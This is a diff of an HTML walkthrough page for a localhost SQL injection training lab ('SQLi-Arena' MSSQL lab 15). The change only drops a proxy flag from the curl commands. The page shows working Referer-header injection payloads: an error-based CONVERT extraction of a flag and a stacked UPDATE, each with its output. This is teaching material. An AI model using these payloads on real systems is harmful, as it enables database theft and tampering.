@@ -9,7 +9,7 @@
         <span class="terminal-title">Step 1. Normal Visit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -H "Referer: http://google.com" \<br>
+        <span class="prompt">$ </span>curl -s -H "Referer: http://google.com" \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab15" -d "visit=1"<br><br>
         <span class="prompt">SQL: </span>INSERT INTO page_visits (url, referer, visitor_ip) VALUES ('/SQLi-Arena/public/mssql/lab15&amp;mode=black&amp;visit=1', 'http://google.com', '127.0.0.1')<br>
         <span class="prompt">Result: </span><strong>Visit logged successfully.</strong> (entry appears in table)
@@ -25,7 +25,7 @@
         <span class="terminal-title">Step 2. Error Confirmation</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 -H "Referer: '" \<br>
+        <span class="prompt">$ </span>curl -s -H "Referer: '" \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab15" -d "visit=1"<br><br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: Incorrect syntax near '127.0'.</strong><br>
         <span class="prompt">// The quote breaks the SQL, confirming header injection!</span>
@@ -41,7 +41,7 @@
         <span class="terminal-title">Step 3. CONVERT Flag Extraction</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 \<br>
+        <span class="prompt">$ </span>curl -s \<br>
         &nbsp;&nbsp;-H "Referer: ' + CONVERT(VARCHAR, CONVERT(INT, (SELECT TOP 1 flag FROM flags))) + '" \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab15" -d "visit=1"<br><br>
         <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_r3f3r3r_h34d3r_1nj}' to data type int.</strong>
@@ -59,7 +59,7 @@
         <span class="terminal-title">Step 4. Stacked UPDATE</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 \<br>
+        <span class="prompt">$ </span>curl -s \<br>
         &nbsp;&nbsp;-H "Referer: x', '127.0.0.1'); UPDATE page_visits SET referer=(SELECT TOP 1 flag FROM flags) WHERE id=20; -- -" \<br>
         &nbsp;&nbsp;"http://localhost/SQLi-Arena/mssql/lab15" -d "visit=1"<br><br>
         <span class="prompt">Result: </span><strong>Visit logged successfully.</strong><br>
